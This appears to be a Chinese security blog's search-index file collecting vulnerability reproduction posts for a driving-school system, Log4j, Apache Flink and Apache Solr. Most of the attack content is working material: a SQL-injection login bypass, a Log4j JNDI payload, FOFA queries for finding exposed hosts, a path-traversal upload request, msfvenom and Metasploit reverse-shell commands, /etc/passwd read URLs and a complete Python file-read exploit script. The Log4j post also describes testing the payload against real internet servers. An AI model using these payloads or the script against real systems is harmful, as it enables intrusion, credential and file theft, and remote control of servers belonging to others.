<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>【1039家校通】SQL注入和后台GETSHELL</title>
    <url>/2021/01/25/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/</url>
    <content><![CDATA[<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>1039家校通网上约车系统是一款驾校一体化系统。其目录中有多个上传点存在sql注入，还存在任意文件上传导致getshell。因为是比较老的漏洞，下面就直接展示挖掘过程了。</p>
<h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>家校通v1.0 - v.6.0</p>
<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="SQL注入万能密码"><a href="#SQL注入万能密码" class="headerlink" title="SQL注入万能密码"></a>SQL注入万能密码</h4><p>登录接口</p>
<pre class="line-numbers language-none"><code class="language-none">&#x2F;admin&#x2F;Product&#x2F;Comstye.aspx
&#x2F;Student&#x2F;StudentLogin.aspx
&#x2F;Teacher&#x2F;Index.aspx
&#x2F;admin&#x2F;login.aspx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/1.png" alt="图片"><br>用户名密码均输入</p>
<pre class="line-numbers language-none"><code class="language-none">&#39; or &#39;&#39;&#x3D;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>可进入后台<br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/2.png" alt="图片"><br>登陆后可任意修改网站内容<br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/3.png" alt="图片"></p>
<h4 id="上传点存在SQL注入"><a href="#上传点存在SQL注入" class="headerlink" title="上传点存在SQL注入"></a>上传点存在SQL注入</h4><h5 id="教练登录手机端存在SQL注入"><a href="#教练登录手机端存在SQL注入" class="headerlink" title="教练登录手机端存在SQL注入"></a>教练登录手机端存在SQL注入</h5><pre class="line-numbers language-none"><code class="language-none">&#x2F;teacherphone&#x2F;teacherlogin.aspx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/8.png" alt="图片"><br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/9.png" alt="图片"></p>
<h5 id="教练点评处存在SQL注入"><a href="#教练点评处存在SQL注入" class="headerlink" title="教练点评处存在SQL注入"></a>教练点评处存在SQL注入</h5><pre class="line-numbers language-none"><code class="language-none">&#x2F;Teacher&#x2F;TeacherPf.aspx?yid&#x3D;0030<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/10.png" alt="图片"><br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/11.png" alt="图片"></p>
<h5 id="管理员后台增加分类处存在SQL注入"><a href="#管理员后台增加分类处存在SQL注入" class="headerlink" title="管理员后台增加分类处存在SQL注入"></a>管理员后台增加分类处存在SQL注入</h5><pre class="line-numbers language-none"><code class="language-none">&#x2F;admin&#x2F;Product&#x2F;comstye2.aspx
&#x2F;admin&#x2F;yk&#x2F;Index.aspx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/13.png" alt="图片"><br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/12.png" alt="图片"><br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/14.png" alt="图片"></p>
<h4 id="后台管理编辑器任意文件上传"><a href="#后台管理编辑器任意文件上传" class="headerlink" title="后台管理编辑器任意文件上传"></a>后台管理编辑器任意文件上传</h4><p>在后台选择产品分类模块，再点击上传图片<br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/4.png" alt="图片"><br>Burp抓包重放数据模块，上传一个asp的大马，上传成功可以看到上传的地址<br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/5.png" alt="图片"><br>访问路径，getshell<br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/6.png" alt="图片"><br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/7.png" alt="图片"></p>
<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>及时联系技术厂家对系统进行升级维护或打补丁</p>
<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://p1kaju.github.io/research/1039-HomeSchool-security-research/">https://p1kaju.github.io/research/1039-HomeSchool-security-research/</a></p>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>2014.7</tag>
      </tags>
  </entry>
  <entry>
    <title>【CNVD-2021-95914/CVE-2021-44228】Apache Log4j RCE漏洞</title>
    <url>/2021/12/10/Apache%20Log4j%20RCE%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>昨晚我正要去睡觉的时候，突然收到了好几个群消息，赶忙看了一下，发现是阿里云安全团队披露了一个Apache Log4j的0day，其实早在11月阿里云就已经向Apache官方提交了报告。</p>
<p>Apache Log4j2是一款优秀的Java日志框架。由于Apache Log4j2某些功能存在递归解析功能，攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置，经阿里云安全团队验证，Apache Struts2、Apache Solr、Apache Druid、Apache Flink等均受影响。</p>
<p>因为Log4j这个框架利用的过于广泛，此漏洞一出，各大厂商纷纷中枪，一时间安全圈陷入了RCE的腥风血雨中，估计好多人都是一夜未眠~~</p>
<h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>Apache Log4j 2.x &lt;= 2.14.1<br>Apache Struts2<br>Apache Solr<br>Apache Druid<br>Apache Flink</p>
<h3 id="漏洞等级"><a href="#漏洞等级" class="headerlink" title="漏洞等级"></a>漏洞等级</h3><p>漏洞等级：10 | 严重</p>
<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="本地复现"><a href="#本地复现" class="headerlink" title="本地复现"></a>本地复现</h4><p>先设置本地端口的监听</p>
<pre class="line-numbers language-none"><code class="language-none">java -jar JNDIExploit-1.2-SNAPSHOT.jar -i [ip]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/images/ApacheLog4jRCE/6.png" alt="图片"><br>用idea打开项目，替换自己的ip，build打包<br><img src="/images/ApacheLog4jRCE/7.png" alt="图片"><br>打包完会出现一个out文件夹，在这里输入如下指令，弹计算器</p>
<pre class="line-numbers language-none"><code class="language-none">java -Dcom.sun.jndi.ldap.object.trustURLCodebase&#x3D;true -jar Log4j-rce.jar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/images/ApacheLog4jRCE/8.png" alt="图片"></p>
<h4 id="实战复现"><a href="#实战复现" class="headerlink" title="实战复现"></a>实战复现</h4><p>因为大部分Apache的服务都存在这个漏洞，我就先找了一个Apache Flink平台<br>fofa语句：</p>
<pre class="line-numbers language-none"><code class="language-none">app&#x3D;&quot;APACHE-flink&quot; &amp;&amp; country&#x3D;&quot;CN&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/images/ApacheLog4jRCE/1.png" alt="图片"><br>找一下输入框，然后放上payload，用自己的dnslog地址</p>
<pre class="line-numbers language-none"><code class="language-none">$&#123;jndi:ldap:&#x2F;&#x2F;xxxxxx.dnslog.cn&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/images/ApacheLog4jRCE/2.png" alt="图片"><br>查看dnslog平台<br><img src="/images/ApacheLog4jRCE/3.png" alt="图片"><br>这个漏洞利用就是这么简单，后面我又测试了其他Apache服务，基本都成功了<br><img src="/images/ApacheLog4jRCE/4.png" alt="图片"><br><img src="/images/ApacheLog4jRCE/5.png" alt="图片"></p>
<h4 id="骚操作"><a href="#骚操作" class="headerlink" title="骚操作"></a>骚操作</h4><p>这个漏洞爆出来后，我的朋友圈就被刷屏了，在里面我还看到了一些挺有趣的骚操作，可以学习一下思路<br><img src="/images/ApacheLog4jRCE/11.png" alt="图片"><br><img src="/images/ApacheLog4jRCE/10.png" alt="图片"><br><img src="/images/ApacheLog4jRCE/9.png" alt="图片"></p>
<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>1.升级Apache Log4j2所有相关应用到最新的 log4j-2.15.0-rc2 版本<br>地址：<a href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2">https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2</a><br>2.升级已知受影响的应用及组件，如srping-boot-strater-log4j2/Apache Solr/Apache Flink/Apache Druid</p>
<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://github.com/Yihsiwei/Log4j-exp">https://github.com/Yihsiwei/Log4j-exp</a><br><a href="https://github.com/feihong-cs/JNDIExploit">https://github.com/feihong-cs/JNDIExploit</a><br><a href="https://mp.weixin.qq.com/s/9f1cUsc1FPIhKkl1Xe1Qvw">https://mp.weixin.qq.com/s/9f1cUsc1FPIhKkl1Xe1Qvw</a></p>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>2021.12</tag>
      </tags>
  </entry>
  <entry>
    <title>【CVE-2020-17519/17518】Apache Flink任意文件上传/读取漏洞复现</title>
    <url>/2021/01/28/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h3 id="FOFA"><a href="#FOFA" class="headerlink" title="FOFA"></a>FOFA</h3><pre class="line-numbers language-none"><code class="language-none">app&#x3D;&quot;Apache-Flink&quot;
app&#x3D;&quot;Apache‐Flink&quot; &amp;&amp; country&#x3D;&quot;CN&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>Apache Flink是由Apache软件基金会开发的开源流处理框架，其核心是用Java和Scala编写的分布式流数据流引擎。在Apache Flink 1.5.1版本中引入了REST API，但其实现上存在多处缺陷，导致任意文件读取（CVE-2020-17519）和任意文件写入（CVE-2020-17518）漏洞<br>CVE-2020-17518攻击者利用REST API，可以修改HTTP头，将上传的文件写入到本地文件系统上的任意位置（Flink 1.5.1进程能访问到的）<br>CVE-2020-17519Apache Flink 1.11.0 允许攻击者通过JobManager进程的REST API读取JobManager本地文件系统上的任何文件（JobManager进程能访问到的）</p>
<h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>CVE-2020-17518<br>Apache:Apache Flink: 1.5.1 - 1.11.2</p>
<p>CVE-2020-17519<br>Apache:Apache Flink: 1.11.0, 1.11.1, 1.11.2</p>
<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>本次漏洞环境使用vulhub的docker环境搭建，vulhub下载地址：<br><a href="https://github.com/vulhub/vulhub/">https://github.com/vulhub/vulhub/</a><br>下载完成后传入装有docker和docker-compose环境的虚拟机，进入目录</p>
<pre class="line-numbers language-none"><code class="language-none">cd vulhub-master&#x2F;flink&#x2F;CVE-2020-17518&#x2F;
docker-compose up -d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>拉取漏洞环境,出现”done”表示拉取成功<br><img src="/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.png" alt="图片"><br><img src="/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2.png" alt="图片"><br>在浏览器输入<a href="http://your-ip:8081查看页面">http://your-ip:8081查看页面</a><br><img src="/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/3.png" alt="图片"></p>
<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="CVE-2020-17518"><a href="#CVE-2020-17518" class="headerlink" title="CVE-2020-17518"></a>CVE-2020-17518</h4><p>访问<a href="http://your-ip:8081，找到Submit">http://your-ip:8081，找到Submit</a> New Job的Add New上传一个jar包，jar包可以在桌面新建一个压缩文件，将zip后缀修改为jar即可，然后抓包<br><img src="/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/14.png" alt="图片"><br>将请求包发送到repeater模块进行修改因为我们不知到当前的路径是什么，所以可以使用../切换到根目录因为我们不知到当前的路径是什么，所以可以使用../切换到根目录<br><img src="/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/4.png" alt="图片"><br><strong>POC:</strong></p>
<pre class="line-numbers language-none"><code class="language-none">POST &#x2F;jars&#x2F;upload HTTP&#x2F;1.1
Host: IP:8081
User-Agent: Mozilla&#x2F;5.0 (X11; Linux x86_64; rv:68.0) Gecko&#x2F;20100101 Firefox&#x2F;68.0
Accept: application&#x2F;json, text&#x2F;plain, *&#x2F;*
Accept-Language: en-US,en;q&#x3D;0.5
Accept-Encoding: gzip, deflate
Referer: http:&#x2F;&#x2F;IP:8081
Content-Type: multipart&#x2F;form-data; boundary&#x3D;---------------------------209638986713202799301320123018
Content-Length: 260
Connection: close
-----------------------------209638986713202799301320123018
Content-Disposition: form-data; name&#x3D;&quot;jarfile&quot;; filename&#x3D;&quot;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;111&quot;
Content-Type: application&#x2F;octet-stream

111

-----------------------------209638986713202799301320123018--<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>在容器中查看文件是否上传成功</p>
<pre class="line-numbers language-none"><code class="language-none">docker ps
docker exec -it [CONTAINER ID] &#x2F;bin&#x2F;bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/6.png" alt="图片"><br><img src="/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/7.png" alt="图片"><br>Flink 本身是没有鉴权的，并且它本身支持任意jar包上传并执行，所以可以通过上传jar包getshell<br>msf生成jar格式的马,lhost为kali的ip，lport为kali接收shell的端口</p>
<pre class="line-numbers language-none"><code class="language-none">msfvenom -p java&#x2F;shell_reverse_tcp lhost&#x3D;**.***.***.**  lport&#x3D;1234 -f jar &gt;&#x2F;home&#x2F;a.jar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/8.png" alt="图片"><br><img src="/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/9.png" alt="图片"><br>启动msf接收shell</p>
<pre class="line-numbers language-none"><code class="language-none">msfconsole
use exploit&#x2F;multi&#x2F;handler
set payload java&#x2F;shell_reverse_tcp
set LHOST **.***.***.**
set LPORT 1234
exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/10.png" alt="图片"><br>到此为止关于公网vps监听就已经设置好了，等待上传shell jar文件的连接就好了<br>在Apache Flink中选择Add New，选择木马jar文件上传,点击刚刚上传的木马文件,选择submit<br><img src="/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/11.png" alt="图片"><br>这时候在返回公网vps发现已经接收到了反弹的shell,不过这个shell权限不大<br><img src="/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/12.png" alt="图片"></p>
<h4 id="CVE-2020-17519"><a href="#CVE-2020-17519" class="headerlink" title="CVE-2020-17519"></a>CVE-2020-17519</h4><p>上面写入后要是不能进入docker查看这里可以利用CVE-2020-17519漏洞进行文件读取，在页面首页输入以下payload查看tmp目录下的文件<br><strong>URL:</strong></p>
<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;ip:8081&#x2F;jobmanager&#x2F;logs&#x2F;..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252ftmp%252f111<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>%252f为/的两次url编码<br><img src="/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/5.png" alt="图片"><br>修改后面的payload改为查看etc下的passwd文件<br><strong>POC:</strong></p>
<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;IP:PORT&#x2F;jobmanager&#x2F;logs&#x2F;..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/13.png" alt="图片"></p>
<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>官方已发布安全版本，请及时下载升级至安全版本<br><a href="https://flink.apache.org/zh/downloads.html">https://flink.apache.org/zh/downloads.html</a></p>
<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.lele8.me/2021/01/19/Apache-Flink-CVE-2020-17519-17518-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">https://www.lele8.me/2021/01/19/Apache-Flink-CVE-2020-17519-17518-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</a><br><a href="https://blog.csdn.net/qq_38154820/article/details/112792615">https://blog.csdn.net/qq_38154820/article/details/112792615</a><br><a href="https://www.cnblogs.com/khz521/p/14023011.html">https://www.cnblogs.com/khz521/p/14023011.html</a></p>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>2021.1</tag>
      </tags>
  </entry>
  <entry>
    <title>【Apache】Apache Solr任意文件读取漏洞复现</title>
    <url>/2021/05/05/ApacheSolr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h3 id="FOFA"><a href="#FOFA" class="headerlink" title="FOFA"></a>FOFA</h3><pre class="line-numbers language-none"><code class="language-none">app&#x3D;&quot;Solr&quot; || app&#x3D;&quot;&quot;Apache-Solr&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>Apache Solr 全版本存在任意文件读取漏洞，攻击者可以在未授权的情况下获取目标系统的敏感文件。</p>
<p>我综合了网上的两种漏洞利用，写了一篇比较详尽的文章。</p>
<h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>Apache Solr 全版本</p>
<h3 id="漏洞PoC"><a href="#漏洞PoC" class="headerlink" title="漏洞PoC"></a>漏洞PoC</h3><p>感谢PeiQi师傅，yyds！</p>
<pre class="line-numbers language-none"><code class="language-none"># coding&#x3D;utf-8
# Apache Solr 全版本任意文件读取
# Fofa：app&#x3D;&quot;Apache-Solr&quot; || app&#x3D;&quot;Solr&quot;

import requests
import json
import sys
import time

def title():
    print(&quot;+～～～～～～～～～～～～～～～～～～～～～～～～～～～～～+&quot;)
    print(&quot;+～～～～～～ Apache Solr 全版本任意文件读取 ～～～～～～+&quot;)
    print(&quot;+～～～～～～     Use: python3 solr.py     ～～～～～～+&quot;)
    print(&quot;+～～～～～～   url: http:&#x2F;&#x2F;x.x.x.x:port   ～～～～～～+&quot;)
    print(&quot;+～～～～～～～～～～～～～～～～～～～～～～～～～～～～～+&quot;)
    time.sleep(2)

def get_name(url):
    url_1 &#x3D; url + &quot;&#x2F;solr&#x2F;admin&#x2F;cores?indexInfo&#x3D;false&amp;wt&#x3D;json&quot;
    try:
        res &#x3D; requests.get(url&#x3D;url_1)
        #将json数据python字典话
        name &#x3D; str(list(json.loads(res.text)[&quot;status&quot;])[0])
        print(&quot;[!]  获取到目标系统name:\033[31m%s\033[0m&quot;%name+&quot;  [0]&quot;+&quot;URL:&quot;+url+&quot;&#x2F;solr&#x2F;&quot;+name+&quot;&#x2F;config&quot;)
        return name
    except Exception as e:
        print(&quot;[!]  目标URL无法进行利用。&quot;,e)
        sys.exit(0)

def check_vul(url,name):
    url_2 &#x3D; url +&quot;&#x2F;solr&#x2F;&quot; + name + &quot;&#x2F;config&quot;
    data &#x3D; &#39;&#123;&quot;set-property&quot; : &#123;&quot;requestDispatcher.requestParsers.enableRemoteStreaming&quot;:true&#125;&#125;&#39;

    try:
        res &#x3D; requests.post(url&#x3D;url_2,data&#x3D;data)
        if &quot;This response format&quot; in res.text and res.status_code &#x3D;&#x3D; 200:
            print(&quot;[!]  \033[31m目标系统存在漏洞\033[0m&quot;)
        else:
            print(&quot;[!]  目标系统不存在漏洞&quot;)
            sys.exit(0)
    except Exception as e:
        print(&quot;[!]  目标系统请求失败。&quot;)
        sys.exit(0)

def read_files(url,name,file_name):
    url &#x3D; url + &quot;&#x2F;solr&#x2F;&quot; + name + &quot;&#x2F;debug&#x2F;dump?param&#x3D;ContentStreams&quot;
    # 此处必须要加content-type,否则读取不到文件
    headers &#x3D; &#123;
        &quot;Content-Type&quot; : &quot;application&#x2F;x-www-form-urlencoded&quot;
    &#125;
    data &#x3D; &quot;stream.url&#x3D;file:&#x2F;&#x2F;&#123;&#125;&quot;.format(file_name)

    try:
        res &#x3D; requests.post(url&#x3D;url,headers&#x3D;headers,data&#x3D;data)
        if &quot;No such file or directory&quot; in res.text:
            print(&quot;[!] 目标系统读取文件失败！&quot;)
            sys.exit(0)
        else:
            print(&quot;正在读取文件..........&quot;)
            content &#x3D; (json.loads(res.text)[&quot;streams&quot;][0][&quot;stream&quot;])
            print(&quot;[o] 读取文件内容为：\n\033[34m&#123;&#125;\033\0m&quot;.format(content))
    except Exception as e:
        print(&quot;[!]  目标系统似乎意外中断了&quot;,e)
        sys.exit(0)

if __name__ &#x3D;&#x3D; &quot;__main__&quot;:
    title()
    url &#x3D; str(input(&quot;\n[!]  请输入目标系统URL: &quot;))
    name &#x3D; get_name(url)
    check_vul(url,name)
    file_name &#x3D; str(input(&quot;[!]  请输入要读取的文件：&quot;))
    read_files(url,name,file_name)


<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>复现环境使用了Apache Solr 8.8.1版本，搭建在kali2021虚拟机上<br><a href="https://archive.apache.org/dist/lucene/solr/8.8.1/">https://archive.apache.org/dist/lucene/solr/8.8.1/</a><br><a href="https://solr.apache.org/downloads.html">https://solr.apache.org/downloads.html</a><br><img src="/images/ApacheSolr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.png" alt="图片"><br>解压后，进入bin目录执行启动命令</p>
<pre class="line-numbers language-none"><code class="language-none">.&#x2F;solr strat<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/images/ApacheSolr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2.png" alt="图片"><br>访问url,出现如下页面即为启动成功<br><img src="/images/ApacheSolr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/14.png" alt="图片"><br>此时启动的solr是没有核心进行索引和搜索的，这里需要创建一个数据驱动模式的核心</p>
<pre class="line-numbers language-none"><code class="language-none">.&#x2F;solr create -c [name]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/images/ApacheSolr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/3.png" alt="图片"></p>
<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="Exploit①"><a href="#Exploit①" class="headerlink" title="Exploit①"></a>Exploit①</h4><p>访问url</p>
<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;192.168.xxx.xxx:8983&#x2F;solr&#x2F;admin&#x2F;cores?indexInfo&#x3D;false&amp;wt&#x3D;json<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/images/ApacheSolr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/4.png" alt="图片"><br>burp数据包为</p>
<pre class="line-numbers language-none"><code class="language-none">GET &#x2F;solr&#x2F;admin&#x2F;cores?indexInfo&#x3D;false&amp;wt&#x3D;json HTTP&#x2F;1.1
Host: 192.168.xxx.xxx:8983
User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko&#x2F;20100101 Firefox&#x2F;88.0
Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8
Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age&#x3D;0
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/images/ApacheSolr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/5.png" alt="图片"><br>再使用burp进行POST请求</p>
<pre class="line-numbers language-none"><code class="language-none">POST &#x2F;solr&#x2F;test&#x2F;config HTTP&#x2F;1.1
Host: 192.168.xxx.xxx:8983
Cache-Control: max-age&#x3D;0
Upgrade-Insecure-Requests: 1
